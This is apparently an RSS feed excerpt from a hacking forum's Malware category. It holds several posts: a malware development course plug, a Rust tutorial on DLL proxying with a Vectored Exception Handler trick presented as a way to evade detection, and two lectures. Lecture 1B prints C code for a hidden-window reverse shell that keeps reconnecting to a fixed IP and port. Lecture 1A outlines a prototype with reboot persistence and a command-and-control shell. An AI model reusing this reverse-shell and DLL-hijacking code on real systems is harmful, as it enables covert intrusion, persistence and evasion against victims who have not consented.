<p>$file</p>
<p>ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped;</p>
<p>$upx -d  wont work ; any ressources should I  take a look  at them ?</p>
<p>ps: I am down to share the binary with whoever is interrested</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/unpacking-an-elf-binary-packed-by-an-unknown-custom-packer/39094">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/unpacking-an-elf-binary-packed-by-an-unknown-custom-packer/39094</link>
          <pubDate>Sun, 11 Feb 2024 03:12:30 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39094</guid>
          <source url="https://0x00sec.org/t/unpacking-an-elf-binary-packed-by-an-unknown-custom-packer/39094.rss">Unpacking an elf binary packed by an unknown custom packer</source>
        </item>
        <item>
          <title>Unlock the Secrets of Malware Development: Comprehensive Course</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hi my fellow members am proud to tell that the promised malware development course is out now,<br>
its 5 hours straight and it begins with the basics to advanced staff and this is part 1<br>
it’s the biggest malware development on the internet<br>
The link to the channel</p>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg">
  <header class="source">
      <img src="https://www.youtube.com/s/desktop/d133835b/img/favicon.ico" class="site-icon" width="16" height="16">

      <a href="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg" target="_blank" rel="noopener nofollow ugc">YouTube</a>
  </header>

  <article class="onebox-body">
    <img src="https://yt3.googleusercontent.com/zMeNKZunaI4ML_acQo1UW-qYDMmBIrIkRl4sxTb_aiPk_d5vnFyGiPMzakSXubw7QZzlKNPmtg=s900-c-k-c0x00ffffff-no-rj" class="thumbnail onebox-avatar" width="500" height="500">

<h3><a href="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg" target="_blank" rel="noopener nofollow ugc">lnl training consult</a></h3>

  <p>Welcome to our YouTube channel, where we offer an extensive range of courses focused on malware development, reverse engineering, low-level security, programming, and much more. Our channel is dedicated to providing top-rated educational content that...</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>Admins, IT personnel, malware developers, hackers please am kindly requesting for your support, i need to reach 1000 subscribers but i cant do it without you guys, am doing everything and have done everything because of your support so please support me by going to my channel and subscribe<br>
BECAUSE WE ARE A COMMUNITY OF SUPPORTIVE INDIVIDUALS SO PLEASE SUPPORT YOUR OWN.<br>
Hackers  its your time to support me</p>
<p>Subscribe, share and like just that<br>
Subscribe please to make the channel grow</p>
            <p><small>9 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/unlock-the-secrets-of-malware-development-comprehensive-course/39072">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/unlock-the-secrets-of-malware-development-comprehensive-course/39072</link>
          <pubDate>Thu, 08 Feb 2024 22:21:53 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39072</guid>
          <source url="https://0x00sec.org/t/unlock-the-secrets-of-malware-development-comprehensive-course/39072.rss">Unlock the Secrets of Malware Development: Comprehensive Course</source>
        </item>
        <item>
          <title>DLL-Load Proxying</title>
          <dc:creator><![CDATA[0xf00I]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1><a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>In this post we’ll focus on the theory of a technique known as DLL Proxying, I already have post covers <a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769">Malware Development Essentials</a> going over some techniques and examples, Check it out,</p>
<p>So What the hell is “DLL Proxying”,</p>
<p>DLL Proxying is a technique in which an attacker replaces a Dynamic Link Library (DLL) with a malicious version, opting to rename the original DLL rather than deleting it. The malicious DLL is designed to exclusively implement the functions targeted for interception or modification by the attacker. Meanwhile, all other functions are forwarded to the original DLL, earning the name “Proxy” for this approach. This method allows the attacker to essentially act as a middleman, intercepting and modifying only the specific functions of interest, while seamlessly forwarding the remaining functions to the original DLL. By doing so, the attacker minimizes the amount of effort required, ensuring that overall functionality is maintained without disruption. This technique is particularly effective for carrying out specific attacks while avoiding unnecessary complications or detection.</p>
<h1><a name="overview-2" class="anchor" href="https://0x00sec.org#overview-2"></a>Overview</h1>
<p>Recently, I’ve been exploring Rust and its offensive capabilities. So I thought DLL-load proxying in Rust. However, before delving into the implementation, Let’s discuss the potential effectiveness of DLL Proxy loading for malicious actors. Let’s examine this example more closely.</p>
<pre><code class="lang-auto">  Application (A)
      |
      +-- Loads "some.dll" (B)
            |
            +-- Executes "Data()" (C)

</code></pre>
<p>In the typical flow, when a DLL is loaded, the system follows a standard process. However, when executing DLL Proxy loading, the flow diverges from the usual path. In this process, a malicious actor creates a deceptive proxy DLL designed to mimic the legitimate “foo.dll.” Unbeknownst to the application, it loads this proxy DLL, assuming it to be the authentic version. The proxy DLL intercepts and redirects function calls to the real “foo_Original.dll.” While facilitating the intended functionality, the proxy DLL concurrently executes covert malicious code, effectively seizing control of the application’s execution flow without the user’s or application’s knowledge.</p>
<p>See,</p>
<pre><code class="lang-auto">  Application (A)
      |
      +-- Loads malicious "foo.dll" (C) - Attacker's Proxy DLL
            |
            +-- Intercepts and redirects calls to "foo_Original.dll" (B)
            |      |
            |      +-- Executes "Data()" (D) from the original DLL
            |      |
            |      +-- Executes additional malicious code (E)
            |
            +-- Application runs with hijacked execution flow

</code></pre>
<p>Implementing DLL proxying for a DLL with numerous exported functions can be laborious. Fortunately, there are tools available to automate this process, such as <a href="https://github.com/Flangvik/SharpDllProxy/" rel="noopener nofollow ugc">SharpDllProxy</a>. This tool generates the Proxy DLL source code based on the extracted functions from the original DLL. The resulting source code simply reads a file into memory and then invokes it within a new thread. This automation streamlines the implementation of DLL proxying, making it more accessible for malicious actors.</p>
<p>Now that we have a high-level overview of how DLL proxying works, Let’s build a legit DLL,  Let’s call it <code>o_foo.dll</code></p>
<pre><code class="lang-rust">use winapi::um::winuser::MessageBoxA;

#[no_mangle]
pub unsafe extern "C" fn legitfunction() {
    let message = "Hello!\0";
    let title = "foo\0";

    MessageBoxA(
        std::ptr::null_mut(),
        message.as_ptr() as *const i8,
        title.as_ptr() as *const i8,
        0,
    );
}
</code></pre>
<p>Now this is simple when this DLL is executed, it shows a message box with the text “Hello!” and the title “foo” on the user’s screen. Additionally, the <code>cargo build --release</code> output is stored in the sample location. Conversely, for DLL proxying, we reroute the execution of a function named <code>legitfunction</code> from one DLL to another, specifically <code>o_foo.dll</code>.  This requires integrating the function into a new (DLL), featuring a <code>DllMain</code> function as the entry point for DLLs.</p>
<pre><code class="lang-rust">use forward_dll;
use winapi::um::winuser::MessageBoxA;

forward_dll::forward_dll!(
    r#"C:\Users\foo\rs\o_foo.dll"#, 
    DLL_VERSION_FORWARDER,
    legitfunction
);

#[no_mangle]
pub unsafe extern "C" fn DllMain(instance: isize, reason: u32, reserved: *const u8) -&gt; u32 {
    if reason == 1 {
        // Display a message box to indicate the DLL is loaded
        MessageBoxA(
            std::ptr::null_mut(),
            "Malicious DLL loaded!\0".as_ptr() as *const i8,
            "foo\0".as_ptr() as *const i8,
            0,
        );

        // Forward the legitfunction from the other DLL
        let _ = DLL_VERSION_FORWARDER.forward_all();

        // Return success
        return 1;
    }
    1
}

</code></pre>
<p>When the DLL is loaded, a message box is displayed to indicate that the DLL has been successfully loaded.</p>
<h2><a name="veh-3" class="anchor" href="https://0x00sec.org#veh-3"></a>VEH</h2>
<p>Ok, Let’s dive into a technique that demonstrates dynamic DLL loading and exception handling using a Vectored Exception Handler (VEH). The goal here is to load a DLL and execute specific operations within the context of an exception, utilizing a guard page violation as a trigger for the exception handler. Vectored Exception Handlers extend Structured Exception Handling on Windows and operate independently of the call stack. VEH will be invoked for unhandled exceptions, irrespective of their location. You can find more information on Vectored Exception Handling in the <a href="https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling" class="inline-onebox" rel="noopener nofollow ugc">Vectored Exception Handling - Win32 apps | Microsoft Learn</a></p>
<ul>
<li>Loads a DLL with a proxied exception handler.</li>
<li>Triggers the VEH by setting a guard page.</li>
<li>Unloads the library.</li>
</ul>
<p>In the implementation stage, we need to establish the necessary steps for dynamically loading a DLL, installing a Vectored Exception Handler (VEH), and defining a custom exception handler tailored for guard page violations. The Vectored Exception Handler (VEH) will be utilized to manipulate the context, specifically modifying the RIP register to redirect execution to <code>LoadLibraryA</code>, and the RCX register to store the function’s argument (module name) for <code>LoadLibraryA</code>. To trigger our exception, VirtualProtect is employed to set the page to <code>PAGE_GUARD</code>, leading to a <code>STATUS_GUARD_PAGE_VIOLATION</code>.</p>
<p>We set up a Vectored Exception Handler (<code>VectoredExceptionHandler</code>) to manage guard page violations and dynamically load the <code>foo.dll</code> DLL using the <code>LoadLibraryA</code> function. This intricate setup ensures that we can control the loading process and execute specific operations within the context of the exception.</p>
<p>The VEH is designed to dynamically load a DLL (<code>kernel32.dll</code>) when such an exception occurs, to leverage a guard page violation exception as a trigger to dynamically load a DLL (<code>kernel32.dll</code>) and execute the <code>LoadLibraryA</code> function. By modifying the registers within the exception context, the code redirects the execution flow to load a specific DLL dynamically during runtime, providing a level of control over the process’s behavior.</p>
<pre><code class="lang-rust">unsafe extern "system" fn vectored_exception_handler(exception_info: *mut EXCEPTION_POINTERS) -&gt; i32 {
    if exception_info.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let exception_record = (*exception_info).as_ref().and_then(|info| info.ExceptionRecord);
    if exception_record.is_none() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let exception_code = exception_record.unwrap().ExceptionCode;
    if exception_code != winapi::shared::ntdef::STATUS_GUARD_PAGE_VIOLATION {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let context_record = (*exception_info).as_mut().and_then(|info| info.ContextRecord);
    if context_record.is_none() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let kernel32_module = GetModuleHandleA(CString::new("kernel32.dll").unwrap().as_ptr());
    if kernel32_module.is_null() {
        eprintln!("Failed to get handle for kernel32.dll");
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let load_library_addr = GetProcAddress(kernel32_module, CString::new("LoadLibraryA").unwrap().as_ptr()) as usize;
    if load_library_addr == 0 {
        eprintln!("Failed to get address for LoadLibraryA");
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let rip_address = (*(*exception_info).as_mut().unwrap().ContextRecord).Rip as usize;
    let load_library_call_address = rip_address - (rip_address - load_library_addr) % 5;

    (*(*exception_info).as_mut().unwrap().ContextRecord).Rip = load_library_call_address as u64;
    (*(*exception_info).as_mut().unwrap().ContextRecord).Rcx = MODULE_NAME.as_ptr() as u64;

    EXCEPTION_CONTINUE_EXECUTION
}
</code></pre>
<p>The initial step involves obtaining the module handle of <code>kernel32.dll</code> and determining the address of the <code>LoadLibraryA</code> function within it. <code>LoadLibraryA</code> is a Windows API function responsible for loading dynamic link libraries (DLLs). Subsequently, the implementation calculates a dynamic address for the <code>LoadLibraryA</code> call based on the current instruction pointer (<code>Rip</code>). After obtaining this dynamic address, it modifies the instruction pointer (<code>Rip</code>) to point to the dynamically calculated address for the <code>LoadLibraryA</code> call. Simultaneously, it sets the RCX register to the address of the DLL name (<code>foo.dll</code>).</p>
<p>For Opsec, storing the <code>LoadLibraryA</code> address directly on the stack might expose a static pattern, making it susceptible to identification through static analysis. By dynamically calculating the address and avoiding a direct push to the stack, the injection technique becomes less predictable and more challenging to detect. This avoidance of direct storage on the stack, coupled with dynamic loading of DLLs and runtime calculation of function addresses, increases the overall unpredictability.</p>
<pre><code class="lang-rust">
fn proxied_load_library(module_name: &amp;str) -&gt; Option&lt;winapi::um::libloaderapi::HMODULE&gt; {
    unsafe {
        let handler = AddVectoredExceptionHandler(1, Some(vectored_exception_handler));
        if handler.is_null() {
            eprintln!("Failed to install Vectored Exception Handler");
            return None;
        }

        let mut old_protection: u32 = 0;
        VirtualProtect(mem::transmute::&lt;_, *mut winapi::ctypes::c_void&gt;(Sleep as usize), 1, PAGE_EXECUTE_READ | PAGE_GUARD, &amp;mut old_protection);
        let addr = GetModuleHandleA(CString::new(module_name).unwrap().as_ptr());

        RemoveVectoredExceptionHandler(handler);

        Some(addr)
    }
}
</code></pre>
<p>Using <code>VirtualProtect</code> to set a page to <code>PAGE_GUARD</code> and induce a guard page violation serves as a subtle method for initiating the Vectored Exception Handler. This approach allows for the dynamic modification of memory protection, introducing an element of variability that makes the technique less static. By triggering the guard page violation, the implementation can seamlessly invoke the Vectored Exception Handler, enabling dynamic adjustments to memory protection settings and contributing to a stealthier execution of the injection technique. <a href="https://github.com/0xf00I/DLLProxying-rs" rel="noopener nofollow ugc">Source Code</a></p>
<p>This was a simple implementation of Proxy-DLL-Loads in Rust, Thanks for reading and I hope you’ve learned something!</p>
<h1><a name="references-4" class="anchor" href="https://0x00sec.org#references-4"></a>References</h1>
<ul>
<li><a href="https://github.com/kleiton0x00/Proxy-DLL-Loads" rel="noopener nofollow ugc">Proxy-DLL-Loads</a></li>
<li><a href="https://dl.packetstormsecurity.net/papers/win/intercept_apis_dll_redirection.pdf" rel="noopener nofollow ugc">Intercepting API Calls via DLL Redirection</a></li>
<li><a href="https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence" rel="noopener nofollow ugc">DLL Proxying for Persistence</a></li>
<li><a href="https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/" rel="noopener nofollow ugc">Proxying DLL Loads for Hiding ETW/ETI Stack Tracing</a></li>
<li><a href="https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/" rel="noopener nofollow ugc">DLL Proxy Loading Your Favorite C# Implant</a></li>
<li><a href="https://x64.moe/posts/proxyingdll/" rel="noopener nofollow ugc">Proxying DLLs with Rust</a></li>
<li><a href="https://github.com/trickster0/OffensiveRust" rel="noopener nofollow ugc">OffensiveRust</a></li>
<li><a href="https://samrambles.com/guides/window-hacking-with-rust/injecting-dlls-with-rust/index.html" rel="noopener nofollow ugc">Injecting DLLs with Rust</a></li>
</ul>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/dll-load-proxying/39031">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/dll-load-proxying/39031</link>
          <pubDate>Sun, 04 Feb 2024 22:29:37 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39031</guid>
          <source url="https://0x00sec.org/t/dll-load-proxying/39031.rss">DLL-Load Proxying</source>
        </item>
        <item>
          <title>Malware development lecture 1B</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>This is lecture 1B of our malware development series</p><p><a href="https://www.youtube.com/watch?v=_ECGY6Fu_9s">Malware development lecture 1B</a></p>

<p>check out the video to understand more<br>
//header files</p>
<p><span class="hashtag-raw">#include</span> &lt;stdio.h&gt;     //standard input/output<br>
<span class="hashtag-raw">#include</span> &lt;stdlib.h&gt;    //standard utilities library<br>
<span class="hashtag-raw">#include</span> &lt;unistd.h&gt;    //access to the POSIX operating system API<br>
<span class="hashtag-raw">#include</span> &lt;winsock2.h&gt;  //windows sockets<br>
<span class="hashtag-raw">#include</span> &lt;windows.h&gt;   //declarations for all functions in Windows API<br>
<span class="hashtag-raw">#include</span> &lt;winuser.h&gt;   //windows controls<br>
<span class="hashtag-raw">#include</span> &lt;wininet.h&gt;   //windows internet interfaces<br>
<span class="hashtag-raw">#include</span> &lt;windowsx.h&gt;  //windows programming interfaces<br>
<span class="hashtag-raw">#include</span> &lt;string.h&gt;    //manupulate strings (char arrays)<br>
<span class="hashtag-raw">#include</span> &lt;sys/stat.h&gt;  //stat() function prototypes<br>
<span class="hashtag-raw">#include</span> &lt;sys/types.h&gt; //other function prototypes</p>
<p>//FUNCTION DEFINITION</p>
<p>int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)<br>
{<br>
//create new window handle<br>
HWND stealth;<br>
AllocConsole();<br>
stealth = FindWindowA(“ConsoleWindowClass”, NULL); //window name = NULL<br>
ShowWindow(stealth, 0); //nCmdShow = 0 hides window</p>
<pre><code>//create socket object
struct sockaddr_in ServAddr;
WSADATA wsaData; //contain winsock.dll info

//check winsock.dll status
if (WSAStartup(MAKEWORD(2,0), &amp;wsaData) != 0)
{
	exit(1);
}

//define socket object
sock = socket(AF_INET, SOCK_STREAM, 0); //establish tcp connection
//set host IP Address and Port [EDIT HERE]
char *ServIP = "192.168.56.1";
unsigned short ServPort = 50000;
memset(&amp;ServAddr, 0, sizeof(ServAddr)); //flush ServAddr with 0

//set ServAddr parameters
ServAddr.sin_family = AF_INET;
ServAddr.sin_addr.s_addr = inet_addr(ServIP); //covert string to IPv4 format
ServAddr.sin_port = htons(ServPort); //convert to network byte order


//wait for server connection to establish
start :
while (connect(sock, (struct sockaddr *) &amp;ServAddr, sizeof(ServAddr)) != 0)
{
	Sleep(10);
	goto start;
}

Shell();
</code></pre>
<p>}</p>
            <p><small>8 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/malware-development-lecture-1b/38795">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-development-lecture-1b/38795</link>
          <pubDate>Wed, 17 Jan 2024 07:42:04 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38795</guid>
          <source url="https://0x00sec.org/t/malware-development-lecture-1b/38795.rss">Malware development lecture 1B</source>
        </item>
        <item>
          <title>Malware development lecture 1A</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Video out now for the following lecture 1A of malware development</p><p><a href="https://www.youtube.com/watch?v=GML0TVvlMVw"> - YouTube</a></p>

<p>What is malware ?</p>
<p>Malware is any software intentionally designed to cause disruption to a computer, server, client, or computer network, leak private information, gain unauthorized access to information or systems, deprive access to information, or which unknowingly interferes with the user’s computer security and privacy.</p>
<p>What is malware development?</p>
<p>This is the development process of malicious software or scripts with intent to stealing target information, spying, espionage purpose and others</p>
<p>What programming languages are best for malware development?</p>
<p>My own opinion</p>
<p>1.Assembly reason faster and next to machine code con hard to learn</p>
<p>C and c++</p>
<p>python for server end</p>
<p>Rust</p>
<p>Lua</p>
<p>Golang</p>
<p>What is computer programming? Computer programming or coding is the composition of sequences of instructions, called programs, that computers can follow to perform tasks</p>
<p>what are the types of malware</p>
<h3><a name="h-1-ransomware-1" class="anchor" href="https://0x00sec.org#h-1-ransomware-1"></a>1. Ransomware</h3>
<p>This is software that uses encryption to disable a target’s access to its data until a ransom is paid. The victim organization is rendered partially or totally unable to operate until it pays, but there is no guarantee that payment will result in the necessary decryption key or that the decryption key provided will function properly.</p>
<h3><a name="h-2-spyware-2" class="anchor" href="https://0x00sec.org#h-2-spyware-2"></a>2. Spyware</h3>
<p>Spyware collects information about users’ activities without their knowledge or consent. This can include passwords, pins, payment information and unstructured messages.</p>
<h3><a name="h-3-trojan-3" class="anchor" href="https://0x00sec.org#h-3-trojan-3"></a>3 Trojan</h3>
<p>This disguises itself as desirable code or software. Once downloaded by unsuspecting users, the Trojan can take control of victims’ systems for malicious purposes. Trojans may hide in games, apps, or even software patches.</p>
<h3><a name="h-4-worms-4" class="anchor" href="https://0x00sec.org#h-4-worms-4"></a>4. Worms</h3>
<p>Worms target vulnerabilities in operating systems to install themselves into networks. They may gain access in several ways: through backdoors built into software, through unintentional software vulnerabilities, or through flash drives. Once in place, worms can be used by malicious actors to launch Dos or Ddos attacks, steal sensitive data, or conduct ransomware attacks.</p>
<ol start="5">
<li>virus</li>
</ol>
<p>This is a piece of code that inserts itself into an application and executes when the app is run. Once inside a network, a virus may be used to steal sensitive data, launch DDoS attacks or conduct ransomware attacks.</p>
<h3><a name="h-6-rootkits-5" class="anchor" href="https://0x00sec.org#h-6-rootkits-5"></a>6. Rootkits</h3>
<p>is software that gives malicious actors remote control of a victim’s computer with full administrative privileges. Rootkits can be injected into applications, kernels, hypervisors, or firmware. They spread through phishing, malicious attachments, malicious downloads, and compromised shared drives.</p>
<h3><a name="h-7keyloggers-6" class="anchor" href="https://0x00sec.org#h-7keyloggers-6"></a>7.Keyloggers</h3>
<p>This is a type of spyware that monitors user activity, keyloggers can be used to steal password data, banking information and other sensitive information. Keyloggers can be inserted into a system through phishing, social engineering or malicious downloads.</p>
<h3><a name="h-8-botsbotnets-7" class="anchor" href="https://0x00sec.org#h-8-botsbotnets-7"></a>8. Bots/Botnets</h3>
<p>A bot is a software application that performs automated tasks on command. They’re used for legitimate purposes, such as indexing search engines, but when used for malicious purposes, they take the form of self-propagating malware that can connect back to a central server.</p>
<h3><a name="h-9-fileless-malware-8" class="anchor" href="https://0x00sec.org#h-9-fileless-malware-8"></a>9. Fileless Malware</h3>
<p>This kind doesn’t install anything initially, instead, it makes changes to files that are native to the operating system, such as PowerShell or WMI. Because the operating system recognizes the edited files as legitimate, a fileless attack is not caught by antivirus software.</p>
<p>MALWARE PAYLOADS</p>
<p>What is staged malware?</p>
<p>Staged payloads break down the distinct phases of an attack, often using multiple payloads phases that a single payload would have otherwise performed. These payloads are typically broken down into a ”stager” (initial payload or beacon) executable and a ”stage” (main payload) executable.</p>
<p>A stagger is a small executable that is an initial payload. It is a relatively small piece of code that is executed to prepare for a much larger and more capable payload known as the stage payload. This means that “the stagger sets the stage.”</p>
<p>what is stageless malware?</p>
<p>Stageless payloads are self-contained and usually much larger than staged payloads. They typically combine all the required capabilities of an attacker into one executable.</p>
<p>What is shell code?</p>
<p>Shell code is a malicious code that attempts to hijack the normal flow of a running program in computer memory. It then redirects the flow so that the malicious code is executed, instead of the normal program, giving the attacker a shell or reverse shell. These are often beacons or payloads in the form of low-level programming code or a machine code combined with an exploit</p>
<p>What are exploits?</p>
<p>Exploits are pieces of low-level or native code that successfully leverage a vulnerability.</p>
<p>Exploited vulnerabilities often involve a buffer overflow in an application’s memory where the attacker has overrun the allocated memory to redirect normal program flow. A successful exploit will then lead to the execution of a payload, which is the malware.</p>
<p>what is a dropper?</p>
<p>A dropper is a kind of Trojan that has been designed to “install” malware on a target computer. The malware code can be contained within the dropper in such a way as to avoid detection by virus scanners; or the dropper may download the malware to the targeted computer once activated.</p>
<p>Types of malware droppers</p>
<p>persistent dropper. Upon running the malware, it hides itself on the device. It then modifies the windows system registry keys, even if the malware is removed the hidden file will execute upon rebooting the system. This allows it to reinstall the malware even if it was previously removed.</p>
<p>non-persistent dropper. It is less dangerous because upon executing its payload it removes itself from the system. This way, when the malware is removed it will not be able to reinstall itself</p>
<p>what is penetration testing?</p>
<p>A penetration test, also known as pentest or ethical hacking, is an authorized simulated cyber attack on a computer system, performed to evaluate the security of the system;</p>
<p>what is red team?</p>
<p>A red team is a group that pretends to be an enemy, attempts a physical or digital intrusion against an organization at the direction of that organization, then reports back so that the organization can improve their defenses. Red teams work for the organization or are hired by the organization. Their work is legal, but can surprise some employees who may not know that red teaming is occurring, or who may be deceived by the red team.</p>
<p>what is incident response?</p>
<p>Incident response (sometimes called Cybersecurity incident response) refers to an organization’s processes and technologies for detecting and responding to cyber threats, security breaches or cyberattacks. The goal of incident response is to prevent cyberattacks before they happen, and to minimize the cost and business disruption resulting from any cyberattacks that occur.</p>
<p>What is digital forensics?</p>
<p>Digital forensics is a branch of forensic science encompassing the recovery, investigation, examination, and analysis of material found in digital devices, often in relation to mobile devices and computer crime.</p>
<p>what is code obfuscation?</p>
<p>code obfuscation refers to a series of programming techniques designed to disguise elements of a program’s code. It’s the primary way that programmers can defend their work against unauthorized access or alteration by hackers or intellectual property thieves.</p>
<p>SPECIFIC TO WINDOWS ENVIRONMENTS</p>
<p>What is a DLL?</p>
<p>A Dynamic Link Library or DLL (“Shared Library” in Linux) is a piece of code stored as a shared library file. This means that it can be used by different computer programs as and when they need it</p>
<p>code injection and DLL injection</p>
<p>DLL injection is the process of running code (DLL) in the context of another process. Meterpreter payloads use DLL injection techniques for stealth and evasion mechanisms.</p>
<p>This is useful for programmers because they only write code once, compile and store it as a shared library or DLL, then use it whenever needed and by multiple programs.</p>
<p>The capabilities of DLLs also make them very useful for threat actors. Code Injection at the basic level involves an attempt by one process (malicious) attaching (or obtaining a handle) to a remote process (victim process). It then allocates enough memory or changing page permissions in the victim process to run new code such as a DLL, after which copying (injecting) the DLL malicious code into the new or already running victim process’ memory space.</p>
<p>Windows API</p>
<p>The Windows API, informally WinAPI, is Microsoft’s core set of application programming interfaces (APIs) available in the Microsoft operating systems. The name Windows API collectively refers to several different platform implementations that are often referred to by their own names (for example, the Win32 API). Almost all Windows programs interact with the Windows API</p>
<p>CREATING A SOFTWARE PROTOTYPE(our malware prototype)</p>
<p>what is a software prototype?</p>
<p>Software prototyping is the activity of creating prototypes of software applications, i.e., incomplete versions of the software program being developed.</p>
<p>The difference between script kiddies and true pros is having programming skills. So we are going to horn these skills together because the truth is one day in your pen test or red teaming endeavors, you will need to write something that is fully undetectable. A lot of you use Metasploit but the problem with this awesome tools is it can only handle one connection at a time but in red teaming engagements, you need in most cases your C2C to control and commands more connections instantly.</p>
<p>So let’s create a tool that will evolve into something big</p>
<p><strong>functions of our prototype</strong></p>
<p><strong>1. connection function between server and target</strong></p>
<p><strong>2. function to listen for incoming connections(shell)</strong></p>
<p><strong>3. be able to survive reboots</strong></p>
<p><strong>4. start other programs</strong></p>
<p><strong>5. changing directory</strong></p>
<p><strong>HELPFUL WINDOW/</strong> <strong>C</strong> <strong>HEADER FILES FOR MALWARE AUTHORS</strong></p>
<p><strong>1.</strong> <strong>#include&lt;stdio.h&gt;</strong></p>
<p><strong><strong>stdio.h</strong></strong> <strong>is the header file for the C library that defines various functions and variables for input and output operations.</strong></p>
<p><strong>#include&lt;stdlib.h&gt;</strong></p>
<p><strong>This header defines several general purpose functions, including dynamic memory management, random number generation, communication with the environment, integer arithmetic, searching, sorting and converting.</strong></p>
<p><strong>#include&lt;unistd.h&gt;</strong></p>
<p><strong>In the</strong> <strong>c</strong> <strong>and</strong> <strong>c++</strong> <strong>programming languages,</strong> <code>unistd.h</code> <strong>is the name of the</strong> <strong>header file</strong> <strong>that provides access to the <a href="https://en.wikipedia.org/wiki/POSIX" rel="noopener nofollow ugc">POSIX</a> <a href="https://en.wikipedia.org/wiki/Operating_system" rel="noopener nofollow ugc">operating system</a> <a href="https://en.wikipedia.org/wiki/Application_programming_interface" rel="noopener nofollow ugc">API</a>. I</strong></p>
<p><strong>#include&lt;winuser.h&gt;</strong></p>
<p><strong><strong>Winuser.h</strong></strong> <strong>is a header file that defines the functions and structures for Windows app development. It contains definitions for common Windows API functions, such as CreateWindow, DialogBox, EnumWindows, and ClipboardFormatListeners, as well as structures for various Windows messages,</strong></p>
<p><strong>#include&lt;winsock2.h&gt;</strong></p>
<p><strong><strong>Windows Sockets API</strong></strong> <strong>(</strong> <strong><strong>WSA</strong></strong> <strong>), later shortened to</strong> <strong><strong>Winsock</strong></strong> <strong>, is an <a href="https://en.wikipedia.org/wiki/Application_programming_interface" rel="noopener nofollow ugc">application programming interface</a> (API) that defines how <a href="https://en.wikipedia.org/wiki/Microsoft_Windows" rel="noopener nofollow ugc">Windows</a> network <a href="https://en.wikipedia.org/wiki/Application_software" rel="noopener nofollow ugc">application software</a> should access network services, especially <a href="https://en.wikipedia.org/wiki/TCP/IP" rel="noopener nofollow ugc">TCP/IP</a>. It defines a standard interface between a Windows TCP/IP client application (such as an <a href="https://en.wikipedia.org/wiki/FTP_client" rel="noopener nofollow ugc">FTP client</a> or a <a href="https://en.wikipedia.org/wiki/Web_browser" rel="noopener nofollow ugc">web browser</a>) and the underlying TCP/IP <a href="https://en.wikipedia.org/wiki/Protocol_stack" rel="noopener nofollow ugc">protocol stack</a>.</strong></p>
<p><strong>#include&lt;wininet.h&gt;</strong></p>
<p><strong>The Windows Internet (WinINet) application programming interface (API) enables your application to interact with FTP and HTTP protocols to access Internet resources. As standards evolve, these functions handle the changes in underlying protocols, enabling them to maintain consistent behavior.</strong></p>
<p><strong>#include&lt;windows.h&gt;</strong></p>
<p><strong>windows.h is a Windows-specific header file for the C and C++ programming languages which contains declarations for all of the functions in the Windows API, all the common macros used by Windows programmers, and all the data types used by the various functions and subsystems</strong></p>
<p><strong>#include&lt;windowsx.h&gt;</strong></p>
<p><strong>This</strong> <strong>header file re-defines many obsolete and out of use function calls (among other things). This header file speeds ports, but fixes no complex problems. For example in WIN32 the “far” and “pascal” keywords are obsolete due to WIN32’s flat memory model and different function calling procedures.</strong></p>
<p><strong>#include&lt;string.h&gt;</strong></p>
<p><strong>This header file provides functions for copying, concatenating, comparing, searching, and manipulating C strings and arrays.</strong></p>
<p><strong>#include&lt;sys/stat.h&gt;</strong></p>
